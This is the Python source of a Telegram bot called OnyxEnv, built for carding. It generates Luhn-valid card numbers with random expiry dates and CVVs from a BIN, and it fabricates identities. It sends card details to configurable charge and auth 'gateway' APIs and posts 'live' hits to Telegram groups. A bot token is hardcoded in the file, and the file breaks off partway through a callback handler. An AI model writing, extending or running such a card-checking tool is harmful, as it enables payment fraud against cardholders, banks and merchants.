import telebot
from telebot import types
import requests
import time
from datetime import datetime
import re
import urllib.parse
import logging
import os
import json
import random
import string
from threading import Lock

# Initialize bot with token
bot = telebot.TeleBot("8531959574:AAGZfk14pI9LkL6kUBvOI6nZPABc7NpNt1g")

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Admin list
ADMINS = [7904483885]
APPROVED_GROUP_FILE = 'chat.txt'
DECLINED_GROUP_FILE = 'declined_chat.txt'
HITS_FILE = 'hits.txt'
DECLINES_FILE = 'declines.txt'
REGISTERED_USERS_FILE = 'onyx.txt'
BANNED_USERS_FILE = 'ban.txt'
GATEWAY_CONFIG_FILE = 'gateway_config.json'
CUSTOM_APIS_FILE = 'custom_apis.json'

# Rate limiting
user_data = {}
FLOOD_WAIT = 3
MAX_CHECKS_PER_HOUR = 500
API_TIMEOUT = 30

# Ensure files exist
for file in [APPROVED_GROUP_FILE, DECLINED_GROUP_FILE, HITS_FILE, 
             DECLINES_FILE, REGISTERED_USERS_FILE, BANNED_USERS_FILE, 
             GATEWAY_CONFIG_FILE, CUSTOM_APIS_FILE]:
    if not os.path.exists(file):
        open(file, 'a').close()

# Load custom APIs
def load_custom_apis():
    try:
        with open(CUSTOM_APIS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_custom_api(command, api_url):
    custom_apis = load_custom_apis()
    custom_apis[command] = api_url
    with open(CUSTOM_APIS_FILE, 'w') as f:
        json.dump(custom_apis, f, indent=4)

def get_gateway_url(command):
    custom_apis = load_custom_apis()
    if command in custom_apis:
        return custom_apis[command]
    
    for category in ['auth', 'charge_low', 'charge_high']:
        if command in GATEWAY_CONFIG.get(category, {}):
            return GATEWAY_CONFIG[category][command].get('url')
    return None

def get_gateway_name(command):
    for category in ['auth', 'charge_low', 'charge_high']:
        if command in GATEWAY_CONFIG.get(category, {}):
            if command in GATEWAY_CONFIG[category]:
                return GATEWAY_CONFIG[category][command].get('name', command)
    return command

def is_gateway_enabled(command):
    for category in ['auth', 'charge_low', 'charge_high']:
        if command in GATEWAY_CONFIG.get(category, {}):
            return GATEWAY_CONFIG[category][command].get('enabled', True)
    return True

def luhn_checksum(card_number):
    def digits_of(n):
        return [int(d) for d in str(n)]
    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d * 2))
    return checksum % 10

def generate_luhn_number(bin_prefix, length=16):
    if len(bin_prefix) >= length:
        return bin_prefix[:length]
    
    remaining_length = length - len(bin_prefix) - 1
    random_part = ''.join([str(random.randint(0, 9)) for _ in range(remaining_length)])
    partial_number = bin_prefix + random_part
    
    def calculate_check_digit(partial):
        digits = [int(d) for d in partial]
        for i in range(len(digits) - 1, -1, -2):
            digits[i] *= 2
            if digits[i] > 9:
                digits[i] -= 9
        total = sum(digits)
        return (10 - (total % 10)) % 10
    
    check_digit = calculate_check_digit(partial_number)
    return partial_number + str(check_digit)

def generate_cards_from_bin(bin_input, count=10):
    cards = []
    
    if '|' in bin_input:
        parts = bin_input.split('|')
        bin_part = parts[0].strip()
        mm_template = parts[1].strip() if len(parts) > 1 else 'xx'
        yy_template = parts[2].strip() if len(parts) > 2 else 'xx'
        cvv_template = parts[3].strip() if len(parts) > 3 else 'xxx'
    else:
        bin_part = bin_input.strip()
        mm_template = 'xx'
        yy_template = 'xx'
        cvv_template = 'xxx'
    
    bin_part = re.sub(r'[^0-9]', '', bin_part)
    
    if len(bin_part) < 6:
        return []
    
    for _ in range(count):
        remaining_length = 16 - len(bin_part)
        random_digits = ''.join([str(random.randint(0, 9)) for _ in range(remaining_length - 1)])
        card_num = generate_luhn_number(bin_part + random_digits[:remaining_length-1], 16)
        
        if mm_template.lower() == 'xxx' or mm_template == 'xx':
            mm = str(random.randint(1, 12)).zfill(2)
        elif 'x' in mm_template.lower():
            mm = mm_template.lower().replace('x', str(random.randint(0, 9)))
            mm = mm[:2].zfill(2)
        else:
            mm = mm_template.zfill(2)
            if int(mm) > 12:
                mm = str(random.randint(1, 12)).zfill(2)
        
        if yy_template.lower() == 'xxx' or yy_template == 'xx':
            yy = str(random.randint(2025, 2032))
        elif 'x' in yy_template.lower():
            yy = yy_template.lower().replace('x', str(random.randint(0, 9)))
            if len(yy) == 2:
                yy = '20' + yy
        else:
            if len(yy_template) == 2:
                yy = '20' + yy_template
            else:
                yy = yy_template
        
        if cvv_template.lower() == 'xxx' or cvv_template == 'xx':
            cvv = str(random.randint(100, 999)).zfill(3)
        elif 'x' in cvv_template.lower():
            cvv = cvv_template.lower().replace('x', str(random.randint(0, 9)))
            cvv = cvv[:3].zfill(3)
        else:
            cvv = cvv_template.zfill(3)
        
        cards.append(f"{card_num}|{mm}|{yy}|{cvv}")
    
    return cards

def generate_fake_address(country="US"):
    country_map = {
        'us': 'US', 'usa': 'US', 'united states': 'US',
        'ca': 'CA', 'canada': 'CA',
        'uk': 'GB', 'gb': 'GB', 'united kingdom': 'GB',
        'au': 'AU', 'australia': 'AU',
        'de': 'DE', 'germany': 'DE',
        'fr': 'FR', 'france': 'FR',
        'it': 'IT', 'italy': 'IT',
        'es': 'ES', 'spain': 'ES',
        'in': 'IN', 'india': 'IN',
        'br': 'BR', 'brazil': 'BR',
        'mx': 'MX', 'mexico': 'MX'
    }
    
    country_code = country_map.get(country.lower(), 'US')
    
    try:
        response = requests.get(f"https://randomuser.me/api/?nat={country_code}", timeout=10)
        if response.status_code == 200:
            data = response.json()
            if 'results' in data and len(data['results']) > 0:
                user_data = data['results'][0]
                name = user_data.get('name', {})
                location = user_data.get('location', {})
                street = location.get('street', {})
                
                email_prefix = ''.join(random.choices(string.ascii_lowercase, k=10))
                email = f"{email_prefix}@teleworm.us"
                
                return {
                    'full_name': f"{name.get('first', 'John')} {name.get('last', 'Doe')}".title(),
                    'street': f"{street.get('number', random.randint(100, 9999))} {street.get('name', 'Main St')}",
                    'city': location.get('city', 'Unknown'),
                    'state': location.get('state', 'Unknown'),
                    'postal_code': location.get('postcode', str(random.randint(10000, 99999))),
                    'phone': user_data.get('phone', str(random.randint(200, 999)) + str(random.randint(100, 999)) + str(random.randint(1000, 9999))),
                    'country': country_code,
                    'email': email
                }
    except:
        pass
    
    first_names = ['James', 'Mary', 'John', 'Patricia', 'Robert', 'Jennifer', 'Michael', 'Linda', 'William', 'Elizabeth']
    last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez']
    streets = ['Main St', 'Oak Ave', 'Maple Dr', 'Pine Ln', 'Cedar Rd', 'Elm Blvd', 'Washington St', 'Park Ave', 'Lake St', 'Hill St']
    cities = ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix', 'Philadelphia', 'San Antonio', 'San Diego', 'Dallas', 'Austin']
    states = ['California', 'Texas', 'New York', 'Florida', 'Illinois', 'Pennsylvania', 'Ohio', 'Georgia', 'North Carolina', 'Michigan']
    
    email_prefix = ''.join(random.choices(string.ascii_lowercase, k=10))
    
    return {
        'full_name': f"{random.choice(first_names)} {random.choice(last_names)}",
        'street': f"{random.randint(100, 9999)} {random.choice(streets)}",
        'city': random.choice(cities),
        'state': random.choice(states),
        'postal_code': str(random.randint(10000, 99999)),
        'phone': str(random.randint(200, 999)) + str(random.randint(100, 999)) + str(random.randint(1000, 9999)),
        'country': country_code,
        'email': f"{email_prefix}@teleworm.us"
    }

def get_bin_info(bin_number):
    try:
        response = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=5)
        if response.status_code == 200:
            return response.json()
    except:
        pass
    return {}

def save_user_to_db(user_info):
    try:
        with open(REGISTERED_USERS_FILE, 'a') as f:
            f.write(f"{user_info}\n")
    except Exception as e:
        logger.error(f"Error saving user to database: {e}")

def is_user_registered(user_id):
    try:
        with open(REGISTERED_USERS_FILE, 'r') as f:
            registered_users = f.read().splitlines()
            return str(user_id) in [line.split(',')[0] for line in registered_users]
    except FileNotFoundError:
        return False

def is_user_banned(user_id):
    try:
        with open(BANNED_USERS_FILE, 'r') as f:
            banned_users = f.read().splitlines()
            return str(user_id) in banned_users
    except FileNotFoundError:
        return False

def get_approved_group():
    try:
        with open(APPROVED_GROUP_FILE, 'r') as f:
            content = f.read().strip()
            return int(content) if content else None
    except (FileNotFoundError, ValueError):
        return None

def get_declined_group():
    try:
        with open(DECLINED_GROUP_FILE, 'r') as f:
            content = f.read().strip()
            return int(content) if content else None
    except (FileNotFoundError, ValueError):
        return None

def save_hit(card_details, status, user_id):
    try:
        with open(HITS_FILE, 'a') as f:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"{card_details} | status{{{status}}} | checked by {user_id} | {timestamp}\n")
        
        approved_group = get_approved_group()
        if approved_group and ('approved' in status.lower() or 'live' in status.lower()):
            try:
                bot.send_message(
                    approved_group,
                    f"✅ New Hit:\n<code>{card_details}</code>\nStatus: {status}\nChecked by: {user_id}",
                    parse_mode='HTML'
                )
            except Exception as e:
                logger.error(f"Error sending to approved group: {e}")
    except Exception as e:
        logger.error(f"Error saving hit: {e}")

def save_decline(card_details, status, user_id):
    try:
        with open(DECLINES_FILE, 'a') as f:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"{card_details} | status{{{status}}} | checked by {user_id} | {timestamp}\n")
        
        declined_group = get_declined_group()
        if declined_group and ('declined' in status.lower() or 'dead' in status.lower()):
            try:
                bot.send_message(
                    declined_group,
                    f"❌ New Decline:\n<code>{card_details}</code>\nStatus: {status}\nChecked by: {user_id}",
                    parse_mode='HTML'
                )
            except Exception as e:
                logger.error(f"Error sending to declined group: {e}")
    except Exception as e:
        logger.error(f"Error saving decline: {e}")

# ============= COMMAND EXTRACTOR - Handles all formats =============
def extract_command_and_args(text):
    if not text:
        return None, None
    
    text = text.strip()
    
    # Remove any prefix like /, ., $ and extra spaces
    cleaned = re.sub(r'^[/\.\$]\s*', '', text)
    cleaned = re.sub(r'^\s*', '', cleaned)
    
    # Split into command and args
    parts = cleaned.split(maxsplit=1)
    if not parts:
        return None, None
    
    raw_cmd = parts[0].lower()
    
    # Remove any trailing dots or special chars from command
    raw_cmd = re.sub(r'[\.\'\"]$', '', raw_cmd)
    
    # Get args if any
    args = parts[1] if len(parts) > 1 else None
    
    # Map short commands to full commands
    cmd_map = {
        'chk': '/chk', 'ca': '/ca', 'ab': '/ab', 'ady': '/ady',
        'bt': '/bt', 'na': '/na', 'pp': '/pp', 'st': '/st',
        'mo': '/mo', 'ppf': '/ppf', 'mp': '/mp', 'sc': '/sc',
        'cl': '/cl', 'ss': '/ss', 'shc': '/shc', 'skb': '/skb',
        'gen': '/gen', 'fake': '/fake', 'bin': '/bin',
        'start': '/start', 'users_data': '/users_data', 'stats': '/stats'
    }
    
    if raw_cmd in cmd_map:
        return cmd_map[raw_cmd], args
    
    if raw_cmd.startswith('/'):
        return raw_cmd, args
    
    return None, None

# ============= BOT COMMANDS =============
@bot.message_handler(commands=['start'])
def send_welcome(message):
    if is_user_banned(message.from_user.id):
        bot.reply_to(message, "🚫 You are banned from using this bot.")
        return
    
    user = message.from_user
    welcome_message = f"""<blockquote>⌬ OnyxEnv | By @onyxEnvSupportBot</blockquote>
<blockquote>Upgrading...</blockquote>
━━━━━━━━━━━━━━━━
✅️ <a href="tg://user?id={user.id}">{user.first_name}</a>
<blockquote>How Are You?</blockquote>
👤 Your UserID - <code>{user.id}</code>
<blockquote>BOT Status - Live!!!</blockquote>"""
    
    keyboard = [
        [
            types.InlineKeyboardButton("Register", callback_data="register"),
            types.InlineKeyboardButton("Commands", callback_data="commands")
        ]
    ]
    
    if user.id in ADMINS:
        keyboard.append([types.InlineKeyboardButton("Admin Panel", callback_data="admin_panel")])
    
    reply_markup = types.InlineKeyboardMarkup(keyboard)
    
    try:
        bot.send_message(
            message.chat.id,
            welcome_message,
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
    except Exception as e:
        logger.error(f"Error sending welcome message: {e}")

def check_registration(message):
    if is_user_banned(message.from_user.id):
        bot.reply_to(message, "🚫 You are banned from using this bot.")
        return False
        
    if not is_user_registered(message.from_user.id):
        bot.reply_to(message, "⚠️ You are not registered! Please use /start and register first.")
        return False
    return True

# ============= MAIN MESSAGE HANDLER =============
@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    if is_user_banned(message.from_user.id):
        return
    
    if not message.text:
        return
    
    # Extract command and args from any format
    command, args = extract_command_and_args(message.text)
    
    if command:
        # Create a new message object with proper format
        class FakeMessage:
            pass
        
        fake_msg = FakeMessage()
        fake_msg.from_user = message.from_user
        fake_msg.chat = message.chat
        fake_msg.message_id = message.message_id
        fake_msg.reply_to_message = message.reply_to_message
        
        if args:
            fake_msg.text = f"{command} {args}"
        else:
            fake_msg.text = command
        
        # Route to appropriate handler
        if command == '/gen':
            handle_gen_command(fake_msg)
        elif command == '/fake':
            handle_fake_address(fake_msg)
        elif command == '/bin':
            handle_bin_check(fake_msg)
        elif command == '/users_data' and message.from_user.id in ADMINS:
            send_users_data(fake_msg)
        elif command == '/stats' and message.from_user.id in ADMINS:
            show_stats(fake_msg)
        elif command == '/start':
            send_welcome(fake_msg)
        elif command in list(GATEWAY_CONFIG['auth'].keys()) + list(GATEWAY_CONFIG['charge_low'].keys()) + list(GATEWAY_CONFIG['charge_high'].keys()):
            handle_gateway_command(fake_msg, command)

def handle_gateway_command(message, command):
    if not check_registration(message):
        return
    
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if not check_rate_limit(user_id, chat_id):
        return
    
    # Extract card details
    if len(message.text.split()) > 1:
        card_details = message.text.split(maxsplit=1)[1]
    elif message.reply_to_message and message.reply_to_message.text:
        card_details = extract_card_details(message.reply_to_message.text)
    else:
        card_details = None
    
    if not card_details:
        bot.reply_to(message, f"Usage: {command} cc|mm|yyyy|cvv\n\nExample: {command} 4111111111111111|12|2026|123")
        return
    
    # Get URL and check if enabled
    api_url = get_gateway_url(command)
    
    if not api_url:
        bot.reply_to(message, f"Gateway {command} not configured.")
        return
    
    if not is_gateway_enabled(command):
        bot.reply_to(message, f"Gateway {get_gateway_name(command)} is disabled.")
        return
    
    gateway_name = get_gateway_name(command)
    
    processing_msg = bot.reply_to(message, f"""
𝗖𝗮𝗿𝗱: <code>{card_details}</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲: {gateway_name}
Processing...
""", parse_mode='HTML')
    
    check_card(message, card_details, api_url, gateway_name, processing_msg.message_id)

def check_card(message, card_details, api_url, gateway_name, processing_msg_id):
    if not validate_card_format(card_details):
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=processing_msg_id,
            text="Invalid format. Use: CC|MM|YYYY|CVV"
        )
        return
    
    try:
        start_time = time.time()
        response = requests.get(api_url + urllib.parse.quote(card_details), timeout=API_TIMEOUT)
        elapsed_time = time.time() - start_time
        
        if response.status_code == 200:
            try:
                data = response.json()
                bin_info = get_bin_info(card_details.split('|')[0][:6])
                
                status = data.get('status', 'Unknown')
                status_lower = status.lower()
                
                if 'approved' in status_lower or 'live' in status_lower:
                    save_hit(card_details, status, message.from_user.id)
                    status_emoji = "✅"
                elif 'declined' in status_lower or 'dead' in status_lower:
                    save_decline(card_details, status, message.from_user.id)
                    status_emoji = "❌"
                else:
                    status_emoji = "⚠️"
                
                brand = bin_info.get('brand', 'Unknown')
                card_type = bin_info.get('type', 'Unknown')
                bank = bin_info.get('bank', 'Unknown')
                country = bin_info.get('country_name', 'Unknown')
                country_flag = bin_info.get('country_flag', '')
                
                response_text = f"""<b>{status_emoji} {status}</b>

[玄]𝗖𝗮𝗿𝗱 : <code>{card_details}</code>
<b>[玄] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲:</b> {gateway_name}
<b>[玄] 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 :</b> {data.get('response', 'No response')}

<b>[玄] 𝙄𝙣𝙛𝙤:</b> {brand.upper()} - {card_type.upper()}
<b>[玄] 𝘽𝙖𝙣𝙠:</b> {bank.upper()}
<b>[玄] 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 :</b> {country.upper()} {country_flag}

<b>𝗧𝗶𝗺𝗲:</b> {elapsed_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"""
                
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=processing_msg_id,
                    text=response_text,
                    parse_mode='HTML'
                )
            except ValueError:
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=processing_msg_id,
                    text="Failed to decode API response."
                )
        else:
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=processing_msg_id,
                text=f"API returned status {response.status_code}"
            )
    except requests.exceptions.Timeout:
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=processing_msg_id,
            text="Request timed out."
        )
    except Exception as e:
        logger.error(f"Error: {e}")
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=processing_msg_id,
            text="Unexpected error. Try again."
        )

# ============= TOOL COMMANDS =============
@bot.message_handler(commands=['gen'])
def handle_gen_command(message):
    if not check_registration(message):
        return
    
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if not check_rate_limit(user_id, chat_id):
        return
    
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /gen <bin|mm|yy|cvv>\n\nExamples:\n/gen 57117\n/gen 57117|15|xxx|157")
        return
    
    bin_input = parts[1].strip()
    processing_msg = bot.reply_to(message, "Generating cards...")
    
    try:
        cards = generate_cards_from_bin(bin_input, 10)
        
        if not cards:
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=processing_msg.message_id,
                text="Failed to generate cards. BIN must be at least 6 digits."
            )
            return
        
        bin_number = re.sub(r'[^0-9]', '', bin_input.split('|')[0])[:6]
        bin_info = get_bin_info(bin_number) if len(bin_number) >= 6 else {}
        
        response_text = f"""𝗕𝗜𝗡 ⇾ {bin_number}
𝗔𝗺𝗼𝘂𝗻𝘁 ⇾ {len(cards)}

"""
        for card in cards:
            response_text += f"{card}\n"
        
        if bin_info:
            brand = bin_info.get('brand', 'UNKNOWN')
            card_type = bin_info.get('type', 'UNKNOWN')
            level = bin_info.get('level', 'STANDARD')
            bank = bin_info.get('bank', 'UNKNOWN')
            country = bin_info.get('country_name', 'UNKNOWN')
            country_flag = bin_info.get('country_flag', '')
            
            response_text += f"""
𝗜𝗻𝗳𝗼: {brand.upper()} - {card_type.upper()} - {level.upper()}
𝐈𝐬𝐬𝐮𝐞𝐫: {bank.upper()}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country.upper()} {country_flag}"""
        
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=processing_msg.message_id,
            text=response_text,
            parse_mode='HTML'
        )
    except Exception as e:
        logger.error(f"Error: {e}")
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=processing_msg.message_id,
            text="Failed to generate cards. Try again."
        )

@bot.message_handler(commands=['fake'])
def handle_fake_address(message):
    if not check_registration(message):
        return
    
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if not check_rate_limit(user_id, chat_id):
        return
    
    parts = message.text.split(maxsplit=1)
    country = parts[1].strip() if len(parts) > 1 else "us"
    
    processing_msg = bot.reply_to(message, "Generating address...")
    
    try:
        address = generate_fake_address(country)
        
        response_text = f"""📍 {country.upper()} Address Generator

𝗙𝘂𝗹𝗹 𝗡𝗮𝗺𝗲: {address['full_name']}
𝗦𝘁𝗿𝗲𝗲𝘁: {address['street']}
𝗖𝗶𝘁𝘆: {address['city']}
𝗦𝘁𝗮𝘁𝗲: {address['state']}
𝗭𝗶𝗽: {address['postal_code']}
𝗣𝗵𝗼𝗻𝗲: {address['phone']}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {address['country']}
𝗘𝗺𝗮𝗶𝗹: {address['email']}"""
        
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=processing_msg.message_id,
            text=response_text,
            parse_mode='HTML'
        )
    except Exception as e:
        logger.error(f"Error: {e}")
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=processing_msg.message_id,
            text="Failed to generate address. Try again."
        )

@bot.message_handler(commands=['bin'])
def handle_bin_check(message):
    if not check_registration(message):
        return
    
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if not check_rate_limit(user_id, chat_id):
        return
    
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /bin <6digit BIN>\n\nExample: /bin 57117")
        return
    
    bin_number = parts[1].strip()[:6]
    
    if not bin_number.isdigit() or len(bin_number) < 6:
        bot.reply_to(message, "BIN must be at least 6 digits!")
        return
    
    processing_msg = bot.reply_to(message, "Checking BIN...")
    
    try:
        bin_info = get_bin_info(bin_number)
        
        if bin_info:
            brand = bin_info.get('brand', 'UNKNOWN')
            card_type = bin_info.get('type', 'UNKNOWN')
            level = bin_info.get('level', 'STANDARD')
            bank = bin_info.get('bank', 'UNKNOWN')
            country = bin_info.get('country_name', 'UNKNOWN')
            country_flag = bin_info.get('country_flag', '')
            
            response_text = f"""𝗕𝗶𝗻: {bin_number}
𝗜𝗻𝗳𝗼: {brand.upper()} - {card_type.upper()} - {level.upper()}
𝐈𝐬𝐬𝐮𝐞𝐫: {bank.upper()}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country.upper()} {country_flag}"""
        else:
            response_text = f"""𝗕𝗶𝗻: {bin_number}
𝗜𝗻𝗳𝗼: UNKNOWN - UNKNOWN - UNKNOWN
𝐈𝐬𝐬𝐮𝐞𝐫: UNKNOWN
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: UNKNOWN"""
        
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=processing_msg.message_id,
            text=response_text,
            parse_mode='HTML'
        )
    except Exception as e:
        logger.error(f"Error: {e}")
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=processing_msg.message_id,
            text="Failed to check BIN. Try again."
        )

# ============= ADMIN COMMANDS =============
@bot.message_handler(commands=['users_data'])
def send_users_data(message):
    if message.from_user.id not in ADMINS:
        bot.reply_to(message, "⚠️ You are not authorized to use this command.")
        return
    
    try:
        with open(REGISTERED_USERS_FILE, 'r') as f:
            users = f.read().splitlines()
        
        if not users:
            bot.reply_to(message, "No registered users found.")
            return
        
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        filename = f"users_data_{timestamp}.txt"
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(f"REGISTERED USERS - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 50 + "\n\n")
            for i, user_line in enumerate(users, 1):
                parts = user_line.split(',')
                user_id = parts[0] if len(parts) > 0 else 'Unknown'
                username = parts[1] if len(parts) > 1 else 'no_username'
                name = parts[2] if len(parts) > 2 else 'Unknown'
                f.write(f"{i}. ID: {user_id}\n")
                f.write(f"   Username: @{username}\n")
                f.write(f"   Name: {name}\n")
                f.write("-" * 30 + "\n")
            f.write(f"\nTotal Users: {len(users)}")
        
        with open(filename, 'rb') as f:
            bot.send_document(
                message.chat.id,
                f,
                caption=f"📊 Users Data Export\nTotal Users: {len(users)}\nDate: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )
        
        os.remove(filename)
        
    except Exception as e:
        logger.error(f"Error sending users data: {e}")
        bot.reply_to(message, f"Error: {e}")

@bot.message_handler(commands=['stats'])
def show_stats(message):
    if message.from_user.id not in ADMINS:
        bot.reply_to(message, "⚠️ You are not authorized to use this command.")
        return
    
    total_users = 0
    total_hits = 0
    total_declines = 0
    
    try:
        with open(REGISTERED_USERS_FILE, 'r') as f:
            total_users = len(f.read().splitlines())
    except:
        pass
    
    try:
        with open(HITS_FILE, 'r') as f:
            total_hits = len(f.read().splitlines())
    except:
        pass
    
    try:
        with open(DECLINES_FILE, 'r') as f:
            total_declines = len(f.read().splitlines())
    except:
        pass
    
    stats_text = f"""
📊 BOT STATISTICS
━━━━━━━━━━━━━━━━━━
👥 Users: {total_users}
✅ Hits: {total_hits}
❌ Declines: {total_declines}
📈 Hit Rate: {round((total_hits / (total_hits + total_declines) * 100) if (total_hits + total_declines) > 0 else 0, 2)}%
"""
    
    bot.reply_to(message, stats_text, parse_mode='HTML')

@bot.message_handler(commands=['ban'])
def ban_user(message):
    if message.from_user.id not in ADMINS:
        bot.reply_to(message, "⚠️ You are not authorized.")
        return
    
    if len(message.text.split()) < 2:
        bot.reply_to(message, "Usage: /ban <user_id>")
        return
    
    user_id = message.text.split()[1]
    try:
        with open(BANNED_USERS_FILE, 'a') as f:
            f.write(f"{user_id}\n")
        bot.reply_to(message, f"✅ User {user_id} has been banned.")
    except Exception as e:
        bot.reply_to(message, f"Error: {e}")

@bot.message_handler(commands=['unban'])
def unban_user(message):
    if message.from_user.id not in ADMINS:
        bot.reply_to(message, "⚠️ You are not authorized.")
        return
    
    if len(message.text.split()) < 2:
        bot.reply_to(message, "Usage: /unban <user_id>")
        return
    
    user_id = message.text.split()[1]
    try:
        with open(BANNED_USERS_FILE, 'r') as f:
            banned_users = [line.strip() for line in f.readlines() if line.strip() != user_id]
        
        with open(BANNED_USERS_FILE, 'w') as f:
            f.write('\n'.join(banned_users))
        
        bot.reply_to(message, f"✅ User {user_id} has been unbanned.")
    except Exception as e:
        bot.reply_to(message, f"Error: {e}")

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    if message.from_user.id not in ADMINS:
        bot.reply_to(message, "⚠️ You are not authorized.")
        return
    
    if len(message.text.split()) < 2:
        bot.reply_to(message, "Usage: /broadcast <message>")
        return
    
    broadcast_text = message.text.split(maxsplit=1)[1]
    try:
        with open(REGISTERED_USERS_FILE, 'r') as f:
            users = f.read().splitlines()
            total = len(users)
            success = 0
            
            for user_line in users:
                try:
                    user_id = user_line.split(',')[0]
                    bot.send_message(user_id, f"📢 Broadcast:\n{broadcast_text}")
                    success += 1
                    time.sleep(0.1)
                except Exception as e:
                    logger.error(f"Error sending to user {user_id}: {e}")
            
            bot.reply_to(message, f"Broadcast sent to {success}/{total} users.")
    except Exception as e:
        bot.reply_to(message, f"Error: {e}")

@bot.message_handler(commands=['addgroup'])
def add_approved_group(message):
    if message.from_user.id not in ADMINS:
        bot.reply_to(message, "⚠️ You are not authorized.")
        return
    
    if len(message.text.split()) < 2:
        bot.reply_to(message, "Usage: /addgroup <group_id>")
        return
    
    group_id = message.text.split()[1]
    try:
        with open(APPROVED_GROUP_FILE, 'w') as f:
            f.write(group_id)
        bot.reply_to(message, f"✅ Approved group set to {group_id}")
    except Exception as e:
        bot.reply_to(message, f"Error: {e}")

@bot.message_handler(commands=['declinegroup'])
def add_declined_group(message):
    if message.from_user.id not in ADMINS:
        bot.reply_to(message, "⚠️ You are not authorized.")
        return
    
    if len(message.text.split()) < 2:
        bot.reply_to(message, "Usage: /declinegroup <group_id>")
        return
    
    group_id = message.text.split()[1]
    try:
        with open(DECLINED_GROUP_FILE, 'w') as f:
            f.write(group_id)
        bot.reply_to(message, f"✅ Declined group set to {group_id}")
    except Exception as e:
        bot.reply_to(message, f"Error: {e}")

@bot.message_handler(commands=['setapi'])
def set_custom_api(message):
    if message.from_user.id not in ADMINS:
        bot.reply_to(message, "⚠️ You are not authorized.")
        return
    
    if len(message.text.split()) < 3:
        bot.reply_to(message, "Usage: /setapi <command> <api_url>\n\nExample: /setapi /chk http://127.0.0.1:8070/key=yashikaaa/cc=")
        return
    
    command = message.text.split()[1]
    api_url = message.text.split()[2]
    
    save_custom_api(command, api_url)
    bot.reply_to(message, f"✅ API set for {command}\n\nNew URL: {api_url}")

def check_rate_limit(user_id, chat_id):
    now = time.time()
    user = user_data.setdefault(user_id, {
        'last_command': 0,
        'command_count': 0,
        'reset_time': now + 3600
    })
    
    if now > user['reset_time']:
        user['command_count'] = 0
        user['reset_time'] = now + 3600
    
    if now - user['last_command'] < FLOOD_WAIT:
        remaining = FLOOD_WAIT - int(now - user['last_command'])
        bot.send_message(chat_id, f"Wait {remaining} seconds.")
        return False
    
    if user['command_count'] >= MAX_CHECKS_PER_HOUR:
        remaining = int((user['reset_time'] - now) // 60)
        bot.send_message(chat_id, f"Limit reached. Try in {remaining} minutes.")
        return False
    
    user['last_command'] = now
    user['command_count'] += 1
    return True

def validate_card_format(card_details):
    try:
        cc, mm, yyyy, cvv = card_details.split('|')
        return (
            len(cc) in (15, 16) and cc.isdigit() and
            len(mm) == 2 and mm.isdigit() and 1 <= int(mm) <= 12 and
            len(yyyy) in (2, 4) and yyyy.isdigit() and
            len(cvv) in (3, 4) and cvv.isdigit()
        )
    except ValueError:
        return False

def extract_card_details(text):
    match = re.search(r'\d{15,16}\|\d{2}\|\d{2,4}\|\d{3,4}', text)
    return match.group(0) if match else None

# ============= CALLBACK HANDLERS =============
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    user = call.from_user
    
    try:
        if is_user_banned(user.id):
            bot.answer_callback_query(call.id, "You are banned.", show_alert=True)
            return
            
        if call.data == "register":
            if is_user_registered(user.id):
                bot.answer_callback_query(call.id, f"Hey {user.first_name} You are already registered", show_alert=True)
                return
                
            save_user_to_db(f"{user.id},{user.username or 'no_username'},{user.first_name}")
            registration_message = f"""<blockquote>[⌬] Registration Successful ♻️</blockquote>
━━━━━━━━━━━━━━
[ϟ] Name: {user.first_name}
[ϟ] User ID: <code>{user.id}</code>"""
            
            keyboard = [[types.InlineKeyboardButton("Commands", callback_data="commands")], [types.InlineKeyboardButton("Back", callback_data="back")]]
            reply_markup = types.InlineKeyboardMarkup(keyboard)
            
